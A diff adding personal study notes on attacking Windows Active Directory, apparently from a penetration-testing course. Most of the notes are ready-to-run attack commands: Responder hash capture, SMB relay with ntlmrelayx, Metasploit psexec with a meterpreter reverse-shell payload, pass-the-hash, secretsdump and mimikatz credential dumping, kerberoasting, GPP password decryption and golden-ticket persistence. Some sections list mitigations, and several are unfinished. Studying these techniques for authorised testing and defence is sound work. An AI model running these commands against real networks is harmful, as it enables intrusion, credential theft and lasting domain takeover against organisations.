@@ -1,0 +1,270 @@
+
+<h1>Initial Attack AD</h1>
+- LLMNR(link local multi-name resolution)
+	- executes when dns fails
+	- Step1: Run responder
+		- python Responder.py -I tun0 -rdwv
+	- Step2: An event occurs
+	- Step3:Get dem hashes
+	- Step4: Crack Dem hashes
+		- hashcat -m 5600 hashes.txt rockyou.txt
+	Mitigations
+		disable llmnr
+		disable nbt-ns
+		cant disable llmnr/nbt-ns
+			require network access control
+			require strong user password
+- SMB Relay
+	- relay hashes to specific machines and potentially gain access
+	- requirements - 
+		- smb signing must be turned off
+		- relayed user credentials must be admin
+	- Step1: Run Responder
+		- turn http and smb off(gedit Responder.conf)
+	- Step2: python Responder.py -I tun0 -rdw
+	- Step3: ntlmrelayx.py -tf targets.txt -smb2support
+	- Step4: An event occurs
+	- Step5: Win
+	- to look for disabled smb host(nmap --script=smb2-security-mode.nse -p445 (ip address))
+	- perform an interactive shell type ntlmrelayx.py -tf targets.txt -smb2support -i( look at the ipaddress and port then in another tab type nc <ipaddress> <port> )
+		- ntlmrelayx.py -tf targets.txt -smb2support -c "whoami" (to execute the command)
+			- commands with interactive file share
+				- shares
+				- use C$
+				- ls
+	- Mitigations
+		- Enable SMB signing on all devices
+			- Pro: Completely stops the attack
+			- Con: Can cause performance issues with file copies
+		- Disable NTLM authentication on network
+			- Pro: Completely stops the attack
+			- Con: If Kereberos stops working, Windows defaults to NTLM
+		- Account tiering:
+			- Pro: Limits domain admins to specific tasks
+			- Con: Enforcing the policy may be difficult
+		- Local admin restriction:
+			- Pro: Can prevent a lot of lateral movement
+			- Con: Potential increase in the amount of service desk tickets
+- Gaining Shell Access(using metasploit)
+	- search psexec
+	- use 10 (exploit/windows.smb/psexec)
+	- options
+	- set rhost <ip address>
+	- set smbdomain <domain>
+	- set smbpass <password>
+	- set smbuser <user>
+	- set payload windows/x64/meterpreter/reverse_tcp
+	- set lhost eth0
+	- run
+	- if that doesnt work show targets
+	- set target (use a different number)
+	- Alternatives
+		- psexec.py domain/user:password@ipaddress
+		- smbexec.py domain/user:password@ipaddress
+		- wmiexec.py domain/user:password@ipaddress
+- IPv6 Attacks(interact with the dns server which may grab info from the DC)
+	- download mitm6 from github fox-it/mitm6
+	- mitm6 -d <domain>
+	- alternative: ntlmrelayx.py -6 -t ldaps://<ip address of dc> -wh <name of ldap> -l lootme
+	- then look at files
+	- firefox <filename.html>
+	- Mitigations
+		- If wpad is not in use internally , disable it via Group Policy and by disabling the WinHttpAutoProxySvc service
+		- Relay to LDAP and LDAPS can only be mitigated by enabling both LDAP signing and LDAP channel binding
+		- Consider Administrative users to the Protected Users group or marking them as Acount is sensitive and cannot be delegated, which will prevent any imperosnation of that user via delegation
+		- Block dhcpv6 traffic
+- Passback attacks
+	- (need to read article)
+
+<h1>Post-Compromise Enumeration</h1>
+	- PowerView
+		- powershell -ep bypass
+		- . .\PowerView.ps1
+		- Get-NetDomain
+		- Get-NetDomainController
+		- Get-DomainPolicy
+		- (Get-DomainPolicy)."system access"
+		- Get-NetUser
+		- Get-NetUser | select cn
+		- Get-NetUser | select samaccountname
+		- Get-NetUser | select description
+		- Get-UserProperty -Properties pwdlastset
+		- Get-UserProperty -Properties logoncount
+		- Get-UserProperty -Properties badpwdcount
+		- Get-NetComputer
+		- Get-NetComputer -FullData
+		- Get-NetComputer -FullData | select OperatingSystem
+		- Get-NetGroup
+		- Get-NetGroup -GroupName "Domain Admins"
+		-  Get-NetGroup -GroupName *admin*
+		-  Get-NetGroupMember -GroupName "Domain Admins"
+		- Invoke-ShareFinder(find file shares)
+		- Get-NetGPO
+		- Get-NetGPO | select displayname, whenchanged
+- BloodHound
+	- start writing here
+
+<h1>Post-Compromise Attacks</h1>
+- pass the password attacks
+	- crackmapexec 
+		- crackmapexec <ip/cidr> -u <user> -d <domain> -p <pass>
+		- pass it locally crackmapexec <ip/cidr> -u <user> -H <hash> --local
+		- installing apt install crackmapexec
+		- change to syntax crackmapexec smb <ip address/cidr> -u <user> -d <domain> -p <password> then use psexec.py to access the other machines
+		- crackmapexec smb <ip address/cidr> -u <user> -d <domain> -p <password> --sam(if successful will perform a sam dump)
+		- psexec.py domain/user:<password>@<ip address>
+			- if successful
+				- whoami
+				- hostname
+	- dumping hashes with secretsdump.py
+		- secretsdump.py domain/user:<password>@<ip address>
+			- it dumps sam hashes,lsa secrets, dpapi_systems
+			- saves hashes in a files to later be cracked by hashcat
+	- cracking hashes with hashcat
+		- hashcat64.exe -m 1000 hashfile.txt wordlist.txt
+		- can pass the hash ntlm hashes but not ntlmv2
+		- account with blank password means it could be disabled
+-  pass the hash attacks
+	- second half of the credential is the hash
+	- crackmapexec smb <ip/cidr> -u "username" -H <hash> --local-auth
+		- green + means that it work
+		- red - means that it does not work
+	- psexec.py "user ":<ip address> -hashes lmHash:ntlmHash
+	- Mitigations
+		- Limit account re-use:
+			- Avoid re-using local admin password
+			- Disable Guest and Administrator accounts
+			- Limit who is local administrator(least privilege)
+		- Utilize passwordsL:
+			- The longer the better (>14 characters)
+			- Avoid using common words
+			- I like long sentences
+		- Privilege Access Management (PAM)
+			- Check out/in sensitive accounts when needed
+			- Automatically rotate passwords on check out and check in
+			- Limits pass attacks as hash/password is strong and constantly rotated
+- Token Impersonation
+	- Tokens are temporary keys that allow you to access to a system/network without having a provide crednetials each time you access a file.
+	- Two Types:
+		- Delegate - Created for logging into a machine or using Remote Desktop(usually rdp sessions)
+		- Impersonate - "non-interactive" such as attaching a network drive or a domain logon script
+	- pop a shell and load incognito(built into meterpreter)
+		- getuid(get the uid)
+		- load incognito(loading the shell)
+		- list_tokens -u(list the available tokens)
+		- impersonate_token domain\\user
+		- shell(load the shell)
+		- whoami(know the user you are impersonating)
+		- try invoke-mimikatz
+			- Invoke-Mimikatz -Command '"privilege::debug" "LSADump::LSA /patch" exit' -Computer <name of domainController>
+			- privilege::debug
+			- LSADump:LSA /patch
+	- Example
+		- Metasploit
+			- msfconsole
+			- use exploit/windows/smb/psexec
+			- options
+			- set rhosts
+			- set smbdomain 
+			- set smbpass
+			- set smbuser
+			- show targets
+			- set target 2
+			- options
+			- exploit
+			- set payload windows/x64/meterpreter/reverse_tcp
+			- options
+			- set lhost eth0
+			- options
+			- run (then a meterpreter shell should appear)
+			- hashdump
+			- getuid
+			- sysinfo
+			- load and then double tab(to list the tools that can be loaded onto meterpreter)
+			- load incognito
+			- incognito help
+			- list_tokens -u (to list users to impersonate)
+			- impersonate_token <domain\\user>
+			- shell 
+			- whoami
+			- control C to go back to meterpreter
+			- rev2self(to go back to yourself and then hashdump to get the hashes)
+	- Mitigations
+		- Limit user/group token creation permissions
+		- Account tiering
+		- Local admin restriction
+- Kerberoasting
+	- Goal of kerberoasting: get the tgs and decrypt server's account hash
+		- Steps to kerberos
+			- 1) Request tgt. Provide ntlm hash
+			- 2) Receive tgt encryption with krbtgt hash
+			- 3) Request tgs for server(presents tgt)
+			- 4) receive tgs encrypt with servers's account hash
+			- 5) Present tgs for service encryption with server;s account
+			- 6) Used when mutual authentication is required.
+		- Steps to kerberoasting
+			- 1) Step1: Get SPNs, Dump Hash
+				- python GetUserSPNs.py <domain/username:password> -dc-ip <ip of DC> -request
+			- 2) Step2: Crack the hash
+				- hashcat64.exe -m 13100 kerberoast.txt rockyou.txt
+	- Example
+		- python GetUserSPNs.py <domain/username:password> -dc-ip <ip of DC> -request
+		- copy entire hash and crack it with hashcat
+		- hashcat64.exe -m 13100 kerberoast.txt rockyou.txt
+	- Mitigations
+		- Strong passwords
+		- Least privilege
+- GPP Attacks
+	- Group Policy Preferences allowed admins to create policies using embedded credentials
+	- These credentials were encrypt and placed in a "cPassword"
+	- The key was accidentally released (whoops)
+	- Patched in MS14-025, but doesn't prevent previous uses
+	- Example
+		- nmap -T5 <ip address>
+			- port 53 domain controller
+			- port 88 kerberos
+			- port 389 ldap
+			- port 636 ldapssl
+		- attack involves smb port 445
+			- smbclient -L \\\\<ip address>\\Replication
+			- prompt off
+			- recurse on (download all of the files I want it to)
+			- mget * (to get all of the files)
+			- looking for Groups.xml file(contains GPP)
+				- Groups.xml contains the c password
+				- gpp -decrypt <cPassword>
+				- psexec.py domain/user:password@<ipaddress>(may not work)
+				- GetUserSPNs.py domain/user:password -dc-ip <ipaddress> -request
+				- get the service ticket and crack with hashcat
+				- hashcat64.exe -m 13100 hashfile.txt rouckyou.txt
+				- now login with administrator credentials
+				- GetUserSPNs.py domain/user:password -dc-ip <dcipaddress> -request
+				- whoami
+				- hostname
+	- URL Attack
+		- compromise a user that has access to a open filed share
+		- scf attack(look at it later)
+	- Mimikatz
+		- Tool used to view and steal credentials, generate Kerberos tickets, and leverage attacks
+		- Dump credentials stored in memory
+		- Just a few attacks: Credentials, Pass-the-hash, Over-the-Hash, Pass-the-Ticket, Golden Ticket, Silver Ticket
+		- download gentilkiwi/mimikatz
+		- Example
+			- mimikatz.exe
+			- privilege::debug
+			- sekurlsa::logonpassword
+			- lsadump::sam
+			- lsadump::sam /patch
+			- lsadump::lsa /patch 
+	- Golden ticket
+		- mimikatz.exe
+		- privilege::debug
+		- lsadump::lsa /inject /name:krbtgt
+		- copy the sid id and ntlm of the krbtgt account
+		- kerberos::golden /User:Administrator /domain:<domain name> /sid:<sid id> /krbtgt:<nltm hash> /id:500 /ptt
+		- misc::cmd
+		- dir \\computername\c$
+		- with psexec.py \\computer name cmd.exe
+		- goldenticket = persistence
+		- also look like silver ticket
+		- 
